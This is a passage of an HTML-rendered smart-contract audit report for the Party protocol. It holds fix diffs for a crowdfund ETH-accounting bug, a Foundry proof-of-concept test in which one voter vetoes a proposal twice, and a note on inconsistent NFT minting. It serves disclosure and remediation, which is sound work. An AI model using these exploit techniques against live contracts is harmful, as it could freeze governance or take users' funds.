class=\"grvsc-source\"><span class=\"mtk1\">index 8ab3b5c..19e09ac 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/contracts/crowdfund/InitialETHCrowdfund.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/contracts/crowdfund/InitialETHCrowdfund.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -240,8 +240,6 @@ contract InitialETHCrowdfund is ETHCrowdfundBase {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint256 ethAvailable = msg.value;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         for (uint256 i; i &lt; numContributions; ++i) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            ethAvailable -= args.values[i];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             (bool s, bytes memory r) = address(this).call{ value: args.values[i] }(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                 abi.encodeCall(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                     this.contributeFor,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -260,6 +258,7 @@ contract InitialETHCrowdfund is ETHCrowdfundBase {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                 }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             } else {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                 votingPowers[i] = abi.decode(r, (uint96));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                ethAvailable -= args.values[i];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         }</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"33\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/contracts/crowdfund/ReraiseETHCrowdfund.sol b/contracts/crowdfund/ReraiseETHCrowdfund.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 580623d..ad70b27 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/contracts/crowdfund/ReraiseETHCrowdfund.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/contracts/crowdfund/ReraiseETHCrowdfund.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -179,8 +179,6 @@ contract ReraiseETHCrowdfund is ETHCrowdfundBase, CrowdfundNFT {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint256 ethAvailable = msg.value;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         for (uint256 i; i &lt; numContributions; ++i) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            ethAvailable -= args.values[i];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             (bool s, bytes memory r) = address(this).call{ value: args.values[i] }(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                 abi.encodeCall(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                     this.contributeFor,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -194,6 +192,7 @@ contract ReraiseETHCrowdfund is ETHCrowdfundBase, CrowdfundNFT {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                 }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             } else {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                 votingPowers[i] = abi.decode(r, (uint96));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                ethAvailable -= args.values[i];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         }</span></span></span></code></pre>\n<p>Now <code>ethAvailable</code> is only reduced when the call to <code>contributeFor</code> was successful.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-party-findings/issues/7#issuecomment-1509833957\">0xean (judge) commented</a>:</strong></p>\n<blockquote>\n<p>Would welcome comment on this issue.  AFAICT, this leads to a direct loss of user funds, which makes me think that a High severity is warranted.  There is no external pre-condition(s) required for this to happen.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-party-findings/issues/7#issuecomment-1509839293\">HollaDieWaldfee (warden) commented</a>:</strong></p>\n<blockquote>\n<p>@0xean - Yeah you are right, it leads to a direct loss of funds and there are no preconditions. Should have set it to “High” probably. </p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-party-findings/issues/7#issuecomment-1512082170\">0xble (Party) confirmed</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-party-findings/issues/7#issuecomment-1521739156\">0xean (judge) increased severity to High</a></strong></p>\n<hr>\n<h2 id=\"h-08-vetoproposal-user-can-veto-multiple-times-so-every-proposal-can-be-vetoed-by-any-user-that-has-a-small-amount-of-votes\" style=\"position:relative;\"><a href=\"#h-08-vetoproposal-user-can-veto-multiple-times-so-every-proposal-can-be-vetoed-by-any-user-that-has-a-small-amount-of-votes\" aria-label=\"h 08 vetoproposal user can veto multiple times so every proposal can be vetoed by any user that has a small amount of votes permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-04-party-findings/issues/2\">[H-08] <code>VetoProposal</code>: User can veto multiple times so every proposal can be vetoed by any user that has a small amount of votes</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-04-party-findings/issues/2\">HollaDieWaldfee</a>, also found by <a href=\"https://github.com/code-423n4/2023-04-party-findings/issues/46\">0x52</a> and <a href=\"https://github.com/code-423n4/2023-04-party-findings/issues/16\">hansfriese</a></em></p>\n<p>The <a href=\"https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/proposals/VetoProposal.sol#L8-L69\"><code>VetoProposal</code></a> contract allows to veto proposals with the <a href=\"https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/proposals/VetoProposal.sol#L19-L60\"><code>voteToVeto</code></a> function.</p>\n<p>When the amount of votes collected to veto a proposal exceeds a certain threshold (the <code>passThresholdBps</code>, which is determined upon initialization of the party), the proposal is vetoed, meaning it cannot execute anymore (its status becomes <code>Defeated</code>).</p>\n<p>The <code>passThresholdBps</code> specifies a percentage of the <code>totalVotingPower</code> of the party.</p>\n<p>E.g. <code>passThresholdBps=1000</code> means that 10% of the <code>totalVotingPower</code> must veto a proposal such that the veto goes through.</p>\n<p>The issue is that the contract lacks the obvious check that a user has not vetoed before, thereby a user can veto multiple times.</p>\n<p>So say a user holds 1% of <code>totalVotingPower</code> and in order for the veto to go through, 10% of <code>totalVotingPower</code> must veto.</p>\n<p>The user can just veto 10 times to reach the 10% requirement.</p>\n<p>The impact is obvious: Any user with a small amount of votes can veto any proposal. This is a critical bug since the party may become unable to perform any actions if there is a user that vetoes all proposals.</p>\n<h3 id=\"proof-of-concept-7\" style=\"position:relative;\"><a href=\"#proof-of-concept-7\" aria-label=\"proof of concept 7 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Add the following test to the <code>VetoProposal.t.sol</code> test file:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"34\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">test_VetoMoreThanOnce</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">_assertProposalStatus</span><span class=\"mtk1\">(</span><span class=\"mtk12\">PartyGovernance</span><span class=\"mtk1\">.</span><span class=\"mtk12\">ProposalStatus</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Voting</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Vote to veto</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">voter1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vetoProposal</span><span class=\"mtk1\">.</span><span class=\"mtk11\">voteToVeto</span><span class=\"mtk1\">(</span><span class=\"mtk12\">party</span><span class=\"mtk1\">, </span><span class=\"mtk12\">proposalId</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">_assertProposalStatus</span><span class=\"mtk1\">(</span><span class=\"mtk12\">PartyGovernance</span><span class=\"mtk1\">.</span><span class=\"mtk12\">ProposalStatus</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Voting</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">vetoProposal</span><span class=\"mtk1\">.</span><span class=\"mtk11\">vetoVotes</span><span class=\"mtk1\">(</span><span class=\"mtk12\">party</span><span class=\"mtk1\">, </span><span class=\"mtk12\">proposalId</span><span class=\"mtk1\">), </span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Vote to veto (passes threshold)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">voter1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vetoProposal</span><span class=\"mtk1\">.</span><span class=\"mtk11\">voteToVeto</span><span class=\"mtk1\">(</span><span class=\"mtk12\">party</span><span class=\"mtk1\">, </span><span class=\"mtk12\">proposalId</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">_assertProposalStatus</span><span class=\"mtk1\">(</span><span class=\"mtk12\">PartyGovernance</span><span class=\"mtk1\">.</span><span class=\"mtk12\">ProposalStatus</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Defeated</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">vetoProposal</span><span class=\"mtk1\">.</span><span class=\"mtk11\">vetoVotes</span><span class=\"mtk1\">(</span><span class=\"mtk12\">party</span><span class=\"mtk1\">, </span><span class=\"mtk12\">proposalId</span><span class=\"mtk1\">), </span><span class=\"mtk7\">0</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// Cleared after proposal is vetoed</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>In the test file, these are the conditions: <code>totalVotingPower = 3e18</code>, required votes threshold is 51%, <code>voter1</code> has <code>1e18</code> votes which is <code>~33%</code>. Clearly <code>voter1</code> should not be able to veto the proposal on his own.</p>\n<p>You can see in the test that <code>voter1</code> can veto 2 times.</p>\n<p>After the first call to <code>voteToVeto</code>, the threshold is not yet reached (the proposal is still in the <code>Voting</code> state).</p>\n<p>After the second call to <code>voteToVeto</code> the threshold is reached and the proposal is in the <code>Defeated</code> state.</p>\n<h3 id=\"tools-used-4\" style=\"position:relative;\"><a href=\"#tools-used-4\" aria-label=\"tools used 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>VSCode, Foundry</p>\n<h3 id=\"recommended-mitigation-steps-7\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-7\" aria-label=\"recommended mitigation steps 7 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>The fix is straightforward.</p>\n<p>We introduce a <code>hasVoted</code> mapping that tracks for each <code>(party, proposalId, address)</code> triplet if it has vetoed already.</p>\n<p>Fix:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"35\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/contracts/proposals/VetoProposal.sol b/contracts/proposals/VetoProposal.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 780826f..fb1f1ab 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/contracts/proposals/VetoProposal.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/contracts/proposals/VetoProposal.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -8,9 +8,11 @@ import &quot;../party/Party.sol&quot;;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> contract VetoProposal {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     error NotPartyHostError();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     error ProposalNotActiveError(uint256 proposalId);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    error AlreadyVotedError(address caller);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     /// @notice Mapping from party to proposal ID to votes to veto the proposal.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     mapping(Party =&gt; mapping(uint256 =&gt; uint96)) public vetoVotes;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    mapping(Party =&gt; mapping(uint256 =&gt; mapping(address =&gt; bool))) public hasVoted;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     /// @notice Vote to veto a proposal.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     /// @param party The party to vote on.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -33,6 +35,12 @@ contract VetoProposal {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         if (proposalStatus != PartyGovernance.ProposalStatus.Voting)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             revert ProposalNotActiveError(proposalId);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        if (hasVoted[party][proposalId][msg.sender]) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            revert AlreadyVotedError(msg.sender);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        hasVoted[party][proposalId][msg.sender] = true;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // Increase the veto vote count</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint96 votingPower = party.getVotingPowerAt(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             msg.sender,</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-party-findings/issues/2#issuecomment-1512069305\">0xble (Party) confirmed</a></strong></p>\n<hr>\n<h1 id=\"medium-risk-findings-12\" style=\"position:relative;\"><a href=\"#medium-risk-findings-12\" aria-label=\"medium risk findings 12 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Medium Risk Findings (12)</h1>\n<h2 id=\"m-01-use-of-_mint-in-reraiseethcrowdfund_contribute-is-incompatible-with-partygovernancenftmint\" style=\"position:relative;\"><a href=\"#m-01-use-of-_mint-in-reraiseethcrowdfund_contribute-is-incompatible-with-partygovernancenftmint\" aria-label=\"m 01 use of _mint in reraiseethcrowdfund_contribute is incompatible with partygovernancenftmint permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-04-party-findings/issues/42\">[M-01] Use of <code>_mint</code> in <code>ReraiseETHCrowdfund#_contribute</code> is incompatible with <code>PartyGovernanceNFT#mint</code></a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-04-party-findings/issues/42\">0x52</a></em></p>\n<p>Misconfigured receiver could accidentally DOS party.</p>\n<h3 id=\"proof-of-concept-8\" style=\"position:relative;\"><a href=\"#proof-of-concept-8\" aria-label=\"proof of concept 8 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p><a href=\"https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/ReraiseETHCrowdfund.sol#L238\">ReraiseETHCrowdfund.sol#L238</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"36\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">    if (previousVotingPower == 0) _mint(contributor); &lt;- @audit-issue standard minting here</span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/ReraiseETHCrowdfund.sol#L374\">ReraiseETHCrowdfund.sol#L374</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"37\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 tokenId = party.mint(contributor, votingPowerByCard[i], delegate); &lt;- @audit-issue uses party.mint</span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/party/PartyGovernanceNFT.sol#L162\">PartyGovernanceNFT.sol#L162</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"38\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">    _safeMint(owner, tokenId); &lt;- @audit-issue PartyGovernanceNFT#mint utilizes _safeMint</span></span></code></pre>\n<p>The issue at hand is that ReraiseETHCrowdfund#_contribute and PartyGovernanceNFT#mint use inconsistent minting methods. PartyGovernanceNFT uses safeMint whereas ReraiseETHCrowdfund uses the standard mint. This is problematic because this means that a contract that doesn’t implement ERC721Receiver can receive a CrowdfundNFT but they can never claim because safeMint will always revert. This can cause a party to be inadvertently DOS’d because CrowdfundNFTs are soul bound and can’t be transferred.</p>\n<h3 id=\"recommended-mitigation-steps-8\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-8\" aria-label=\"recommended mitigation steps 8 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Use _safeMint instead of _mint for ReraiseETHCrowdfund#_contribute</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-party-findings/issues/42#issuecomment-1512115454\">0xble (Party) confirmed and commented</a>:</strong></p>\n<blockquote>\n<p>I think a better mitigation would be to allow the user to specify a <code>receiver</code> address that can receive the party NFT when claiming, so if they cannot claim themselves they can specify another address that should receive it instead. It works similarly in <code>Crowdfund</code>, used to implement prior crowdfunds.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-02-maxcontribution-check-can-be-bypassed-to-give-a-card-high-voting-power\" style=\"position:relative;\"><a href=\"#m-02-maxcontribution-check-can-be-bypassed-to-give-a-card-high-voting-power\" aria-label=\"m 02 maxcontribution check can be bypassed to give a card high voting power permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-04-party-findings/issues/39\">[M-02] <code>MaxContribution</code> check can be bypassed to give a card high voting power</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-04-party-findings/issues/39\">evan</a>, also found by <a 